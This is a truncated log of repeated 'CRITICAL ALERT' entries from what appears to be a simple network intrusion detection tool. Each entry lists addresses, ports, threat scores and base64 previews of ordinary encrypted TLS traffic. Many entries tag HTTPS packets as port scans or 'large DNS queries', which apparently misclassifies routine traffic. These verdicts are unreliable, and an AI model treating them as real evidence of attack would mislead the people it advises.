
==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.454846
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] 1SpcUpD1eK3le5PdaHde5IoI+IQ4/sR4JewZ9zi8g/inajTN2DGGagrgEVdQ4lMZajdJeOMRBiOZbRM/F+sF5pyHigbchjhOdWA6cIGZDfJGSQZVWgYw8oCz8qKOheVb9tHagQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.455783
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] TmjchX/PN3xSAwBJgaoyGnYuExREiTyLyiIv1smZuBAy51ylAsTVz6TQQnDN6J56kO1llCa/W/goUkiZZAy0ct/rFl3tnjXeuWeU6ClloEdFoUGP/I8Yyu2SV1/EmSThSYg0uA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.456776
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] DA1rcvN084Hyi8/XFY6RpIHZp+097daR8V3G9DpeJkQGF+hAPZx7p8Fu3405MxcEsd7pP0qRjP9acvMxMlQpkTz1/k5xLnvaPwxkxWMmteNVKKahM9HYXxLTYfGITQnAV3dh8w==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.457748
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] X8Pfnk4bYzPg01W8g1Uz1PK/2xN+AoeL8hifHqhL8BMBd1FzLscZzZkZiOyHsZQcMwiI/pHNbCIMi8YSmUfn9NV7eu4Bo4gWrZbv9RTDoTAodXXRvU0QV51ipD+/FzXTGN5GDg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.458771
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] Hr0WLyjjfT3cs0Lr8YLwUDU3N3Ts//Wi+82kHfz630YB53QAm0p9DDeiiak4bFQbrn8KJ63V341uK0cSn5OLW25+GhskA8pt1CQ0tkemch06rQ9NVNlABpwktLKek+kOyWc5uQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.459545
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] fOKSFo+iMMdCf1tUjK1rs3gWcKBAaUo+u+Os7z1X4K6I7a2pOM5HQxXnSaZ/ycW8KzwKPKWFfXdi2+UG/Lz47JSneFoZjVMgi8jmIN9coAo55arkx2oo5FrJrYPOZDO8CvbTjg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.460277
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] g5oqSaLlA2b/lvjpCjEOXW8KmAS0c0jWjlk1zUkSJtg579i0z1UmIcTC07NJQyQ2Oe/5FNiEqqYVKn3HlQvJx/XiIgKwSHdBYC+4eBTAT2vGwqxZYsnKoj6zcVYEyfX2nuPwuw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.460941
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] wEsup5Qp//WrpWwVagwU0u7mDiKilwtmjg+0qgLkuXi8zfE8/NVAoOhpg+YUDgUUQ/RxPgZSnnKSl3/53KMPg5hTO6Ui7v1SQHoZH8r4IcDFzO2SsgAiWERk1JTNoRxRVXGm1A==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.461545
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 772 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] TkXqhAmYJqfa87zGJJfr9FCzpv50iF7nNbqBS8cU4T+j3BWX+7c/jGaJX2jZzrnPS5I3PTMXCkg+lBiBRDwPhj+jGOFNtDTBQunDDbaHFKlnUrHZ9wKOTfJdH6IrJfJHdooLVA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.483577
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 180 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMBACDFoyOKeUp6gZNjcGAgdTny11+nq1T7DNSDROFsv4s9aBcDAQAgHiFw7GDaQ5JzT+VmSf4r/VBT5q8EOjZ8lwVNJaq8sfQXAwEAIL+EqqB7kVN6C98bEyQXtka1DYM56g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.496108
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 180 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMBACC4sfZKMZ+Z73OBMACwfD69yyfgy7RuHcmdvkZwl3TVlhcDAQAgcskwsT2a459QNxksO6o6gs3hlDrgZyik2AZkgfjhD60XAwEAIIw1j1SIZjWmP/toxmhQodBSLkZP5Q==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.497079
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 192.168.61.129:46196
  Destination: 34.107.243.93:443
  Protocol: TCP
  Payload Size: 39 bytes

Payload Preview:
[BASE64] FwMDACKf7h4ZffZmg1fLGQnjWhcxEtyEGDKh7IumXfRQxJbythY9...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.499123
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 151.101.1.91:443
  Destination: 192.168.61.129:34984
  Protocol: TCP
  Payload Size: 39 bytes

Payload Preview:
[BASE64] FwMDACKveR03YWr0bW3ottRrVW1972mK8Y1ArHXYyiZa9HoSxaqN...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.501851
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 74 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMBACAJIlTf3xe1cLHHSXUG2ue3gcLQmqYvsW/PNkDxUUAN+RcDAQAgVG8Rkt8PzQIgHvZhW6ap1U/F9WCo8o9QmroDgyEZExg=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.502649
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 106 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMBACA00qA6w/JzSNb2oKpvTzaTdPezCpmg1r+WRCDuSqsknBcDAQBA/A5EGxNUA6nGHxOGMdxLcKFPzlQXQa60olxaAgyQqhxsAHbmKesta8IYumUWXeg+84CWypIJmaiv9g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.503591
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 192.168.61.129:55502
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 39 bytes

Payload Preview:
[BASE64] FwMDACIOM1vNCaUIWqKNoUcD7ZufYHZXhe40MiOyGhOFNf2M3VEY...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.165722
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:42738
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 139 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAIYAAAAAAAAABCZOhpxcs7umHpkaXVNz2yPh3eTa9kFLMde4oVcBeF8luKxasumUnKpXi3/drXlx/qVyIDnN2dyTuczjKgwQo1HOSllgLyvpuxfg/sBLW1Dm5H/mrEUdlw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.266244
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:42738
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 174 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAKkAAAAAAAAABbyXoCspdw1tJAvfyJBENLwb6khkhSGl+pHFnZ+rQv6NurxV7Z6BTMrlVHjKq6NaPlvTZMp59Y18tUX81XaFwz2/qQ11y/TP63Xr6xL8XIN8prRTKb9qSA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.267378
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:42738
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 174 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAKkAAAAAAAAABbyXoCspdw1tJAvfyJBENLwb6khkhSGl+pHFnZ+rQv6NurxV7Z6BTMrlVHjKq6NaPlvTZMp59Y18tUX81XaFwz2/qQ11y/TP63Xr6xL8XIN8prRTKb9qSA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.603648
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 517 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBAgABAAH8AwM0WnQh0c2OViVhfHnId2qcTziqaoJrEsSjkAtXZ8QvhiBaeZXg2axEVlVxhMz9mLRmeYL0A1b54PRsR44oJ25OWgAcwCvAL8ypzKjALMAwwArACcATwBQAnA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.608099
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 517 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBAgABAAH8AwM0WnQh0c2OViVhfHnId2qcTziqaoJrEsSjkAtXZ8QvhiBaeZXg2axEVlVxhMz9mLRmeYL0A1b54PRsR44oJ25OWgAcwCvAL8ypzKjALMAwwArACcATwBQAnA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.727447
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 51 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFgMDACgAAAAAAAAAANfna/KIBdfkFB5dbVQI3pyReWeZUruYBtpV99jaEKRw...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.729038
Signature(s): large_dns_query
Threat Score: 10

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 99 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAF4AAAAAAAAAAeZ4Ig87mKa2xPJvPfbzwcxRAGAOvxuG2dgnMItoIry/feSfOfHnP9e7DnfktmwaUJ46NkRUMKN2XMWhgm0rz9xm5Akcz06hsUTKRhPEv9ZwwlqwrDdR...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.730940
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 51 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFgMDACgAAAAAAAAAANfna/KIBdfkFB5dbVQI3pyReWeZUruYBtpV99jaEKRw...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.731656
Signature(s): large_dns_query
Threat Score: 10

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 99 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAF4AAAAAAAAAAeZ4Ig87mKa2xPJvPfbzwcxRAGAOvxuG2dgnMItoIry/feSfOfHnP9e7DnfktmwaUJ46NkRUMKN2XMWhgm0rz9xm5Akcz06hsUTKRhPEv9ZwwlqwrDdR...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.732487
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 275 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAQ4AAAAAAAAAAnkbqIXRys/wa6peKwbMGfiW4vyAEgCTAto824pWXdAIuynPsk+kAgVrqeRnqChJ00Fy8ZMkiAxWCxkhnzfvegPXJgtgL0mnPbygEFkdMioTEAkk3js1Kg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.733337
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 275 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAQ4AAAAAAAAAAnkbqIXRys/wa6peKwbMGfiW4vyAEgCTAto824pWXdAIuynPsk+kAgVrqeRnqChJ00Fy8ZMkiAxWCxkhnzfvegPXJgtgL0mnPbygEFkdMioTEAkk3js1Kg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.765970
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 38 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACEAAAAAAAAAA/np/R3qpUggWlfHY7X6zG5gGjPmFG0joMY=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.767337
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 38 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACEAAAAAAAAAA/np/R3qpUggWlfHY7X6zG5gGjPmFG0joMY=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.849659
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABMwR7ywGQ7Ik+wRxJGB+x4ghq4rN67ZwPJfVOCIgyZgsCA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:16.857658
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABMwR7ywGQ7Ik+wRxJGB+x4ghq4rN67ZwPJfVOCIgyZgsCA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:47.374397
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:46088
  Destination: 34.160.90.233:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABpa1FJRzT7wI/chDbR9dNlXgOhS7wDx5fybUiKW9UltYBA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:47.375029
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52942
  Destination: 151.101.193.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABDo6w7XVUfUfOAUuBFfA7Iv8wDlJQ2gHlJzaIEWed2UY2g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:47.392356
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:46088
  Destination: 34.160.90.233:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABpa1FJRzT7wI/chDbR9dNlXgOhS7wDx5fybUiKW9UltYBA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:47.394126
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52942
  Destination: 151.101.193.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABDo6w7XVUfUfOAUuBFfA7Iv8wDlJQ2gHlJzaIEWed2UY2g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:48.384409
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:54820
  Destination: 151.101.129.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABO78dl8+XkHcPMNfSbpXElz2RnCkXLKU/PXCh2kkvc80Ew==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:48.384975
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:54820
  Destination: 151.101.129.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABO78dl8+XkHcPMNfSbpXElz2RnCkXLKU/PXCh2kkvc80Ew==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:15.310172
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABVZY9V43SEIOuLpnicgaywfcRGiiPmqUCrS7DVWMGOk4JA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:15.311108
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:42738
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABlm1SojkbuQ5IHT4y/qOweIN4EBGbj9TsbAg9MbmUYdgwA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:15.314603
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:52606
  Destination: 34.160.144.191:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABVZY9V43SEIOuLpnicgaywfcRGiiPmqUCrS7DVWMGOk4JA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:15.315337
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:42738
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABlm1SojkbuQ5IHT4y/qOweIN4EBGbj9TsbAg9MbmUYdgwA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.703686
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBCdYBAAnSAwOXfnEE8B9xLPe8xfRSmnJhP8AN3JZTykncpmEMfD9ZSiDxb+Dk1PNkkIdDCPxO6Fq7+rrHozmMVp97IYKOCkmi7AAiEwETAxMCwCvAL8ypzKjALMAwwArACQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.705085
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1063 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] XwAdACBfa/qwffvqBaxs/UhcgTmq9Vu7w10ICxt9FstUQNOhXwAXAEEEszgWvo2jrRtwSsct/aonqWAt5CD2rMA24fHWxgW+0tOfiTNMJDNAdE7/ddo6iokXflb/7+4/PU8xzg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.706690
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBCdYBAAnSAwOXfnEE8B9xLPe8xfRSmnJhP8AN3JZTykncpmEMfD9ZSiDxb+Dk1PNkkIdDCPxO6Fq7+rrHozmMVp97IYKOCkmi7AAiEwETAxMCwCvAL8ypzKjALMAwwArACQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.707478
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1063 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] XwAdACBfa/qwffvqBaxs/UhcgTmq9Vu7w10ICxt9FstUQNOhXwAXAEEEszgWvo2jrRtwSsct/aonqWAt5CD2rMA24fHWxgW+0tOfiTNMJDNAdE7/ddo6iokXflb/7+4/PU8xzg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.896391
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 64 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFwMDADUUp7e6bDlAeqJZF0ErWPYJAlXeiVnIjf425GxyUu8K/etW7jh45CKcmRBmWudN0hhvggrSTw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.898168
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 92 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAFd/vX3JZkFEUJaT2aFV29ouoOokMRkikvGVBK7jUXeOoS8TXgBRvqHeNyP6tNuEWHzUHCuBhDEAkZWBFsxYKWSuqUbmvR+qL1ij7PKcGlXO2c0tgl2z39I=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.899915
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 440 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAbMpOCT2j0OuiLmMaoXBqBtJbvQHltFVx2vkRkiASdCKba5HvoinA8GjzrSeAn7fiMymSmrD2voI6k42BrsEmjp5t67YPGcEBXFGwY1WdkHQ/estTdr9u8cQPefdRZi0CQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.915742
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 64 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFwMDADUUp7e6bDlAeqJZF0ErWPYJAlXeiVnIjf425GxyUu8K/etW7jh45CKcmRBmWudN0hhvggrSTw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.917126
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 92 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAFd/vX3JZkFEUJaT2aFV29ouoOokMRkikvGVBK7jUXeOoS8TXgBRvqHeNyP6tNuEWHzUHCuBhDEAkZWBFsxYKWSuqUbmvR+qL1ij7PKcGlXO2c0tgl2z39I=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.918301
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 440 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAbMpOCT2j0OuiLmMaoXBqBtJbvQHltFVx2vkRkiASdCKba5HvoinA8GjzrSeAn7fiMymSmrD2voI6k42BrsEmjp5t67YPGcEBXFGwY1WdkHQ/estTdr9u8cQPefdRZi0CQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.924909
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDBet1UoYkkyNDCOcQkkAJRxxIpRcQFOJbWWkKpx6kkRd8iSNQZKcslGUgdTnuTlVqYSftxcXS5hZ6C6t+9IWdwN3OzkcnEUs/nwH5RTehFKMij5W2QOtkKASw2mxqYbZ10A==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.926349
Signature(s): large_dns_query
Threat Score: 10

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 60 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] dUlZQUAo9T8eK+Zk9ndIBx8hRMkO+Y9nzlnunCstUYHriuvggCugoERBbCKU65Mw4XFyLAWqCQVKLOih...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.928535
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDBet1UoYkkyNDCOcQkkAJRxxIpRcQFOJbWWkKpx6kkRd8iSNQZKcslGUgdTnuTlVqYSftxcXS5hZ6C6t+9IWdwN3OzkcnEUs/nwH5RTehFKMij5W2QOtkKASw2mxqYbZ10A==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.929236
Signature(s): large_dns_query
Threat Score: 10

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 60 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] dUlZQUAo9T8eK+Zk9ndIBx8hRMkO+Y9nzlnunCstUYHriuvggCugoERBbCKU65Mw4XFyLAWqCQVKLOih...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.933379
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 31 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABoUqZyzAJuIZCZTMLoF9U/kDDguLjndHkL5Dw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:23.946482
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 31 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABoUqZyzAJuIZCZTMLoF9U/kDDguLjndHkL5Dw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:24.151102
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
